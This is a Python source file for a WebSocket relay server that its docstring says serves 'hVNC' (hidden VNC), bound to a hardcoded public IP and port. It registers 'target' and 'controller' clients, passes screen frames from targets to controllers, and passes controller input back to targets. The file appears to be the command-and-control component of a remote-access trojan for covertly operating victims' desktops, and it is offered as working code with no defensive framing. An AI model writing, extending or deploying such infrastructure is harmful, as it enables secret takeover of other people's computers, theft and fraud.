#!/usr/bin/env python3
"""
VNC Relay Server - Lightweight WebSocket relay for hVNC
Runs on: 51.83.6.5:20113
"""

import sys
import subprocess
import os

# Auto-install dependencies
def install_requirements():
    """Auto-install required packages"""
    required_packages = ['websockets']
    
    for package in required_packages:
        try:
            __import__(package)
            print(f"[✓] {package} already installed")
        except ImportError:
            print(f"[*] Installing {package}...")
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", package])
                print(f"[✓] {package} installed successfully")
            except subprocess.CalledProcessError:
                print(f"[!] Failed to install {package}")
                print(f"[!] Please run: pip3 install {package}")
                sys.exit(1)

# Install requirements before importing
print("[*] Checking dependencies...")
install_requirements()

import asyncio
import websockets
import json
from collections import defaultdict

# Store connected clients
clients = {}  # client_id -> websocket
sessions = {}  # target_id -> controller_id

async def handle_client(websocket):
    """Handle WebSocket client connection"""
    client_id = None
    try:
        # Get client info from first message
        init_msg = await websocket.recv()
        
        if isinstance(init_msg, str):
            data = json.loads(init_msg)
            client_id = data.get('id')
            role = data.get('role', 'unknown')  # 'target' or 'controller'
            
            clients[client_id] = websocket
            print(f"[+] Client connected: {client_id} ({role})")
            
            # Send ACK
            await websocket.send(json.dumps({'status': 'connected', 'id': client_id}))
        
        # Handle messages
        async for message in websocket:
            if isinstance(message, bytes):
                # Binary message - VNC frame data
                msg_type = message[0]
                
                if msg_type == 0x01:  # CONNECT
                    target_id = message[1:37].decode('utf-8').strip()
                    sessions[target_id] = client_id
                    print(f"[+] Session: {target_id} -> {client_id}")
                
                elif msg_type == 0x02:  # DATA (target -> controller frames)
                    target_id = message[1:37].decode('utf-8').strip()
                    if target_id in sessions:
                        controller_id = sessions[target_id]
                        if controller_id in clients:
                            await clients[controller_id].send(message[37:])
                
                elif msg_type == 0x03:  # CONTROL (controller -> target input)
                    target_id = message[1:37].decode('utf-8').strip()
                    if target_id in clients:
                        await clients[target_id].send(message[37:])
            
            elif isinstance(message, str):
                # JSON control message
                data = json.loads(message)
                cmd = data.get('cmd')
                
                if cmd == 'connect':
                    target_id = data.get('target_id')
                    sessions[target_id] = client_id
                    print(f"[+] Session: {target_id} -> {client_id}")
                    await websocket.send(json.dumps({'status': 'session_created'}))
                
                elif cmd == 'ping':
                    await websocket.send(json.dumps({'status': 'pong'}))
    
    except websockets.exceptions.ConnectionClosed:
        pass
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        # Cleanup
        if client_id:
            if client_id in clients:
                del clients[client_id]
            
            # Remove sessions
            to_remove = [k for k, v in sessions.items() if v == client_id]
            for k in to_remove:
                del sessions[k]
            
            print(f"[-] Client disconnected: {client_id}")

async def main():
    print("=" * 60)
    print("VNC Relay Server v1.0")
    print("=" * 60)
    print("[*] Starting on 0.0.0.0:20113")
    
    async with websockets.serve(
        handle_client,
        "0.0.0.0",
        20113,
        max_size=10 * 1024 * 1024,  # 10MB max message size
        ping_interval=30,
        ping_timeout=10
    ):
        print("[+] Server started successfully")
        print("[+] Listening on ws://51.83.6.5:20113")
        print("[*] Press Ctrl+C to stop")
        print("=" * 60)
        await asyncio.Future()  # Run forever

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[!] Server stopped by user")
    except Exception as e:
        print(f"\n[!] Fatal error: {e}")
        sys.exit(1)
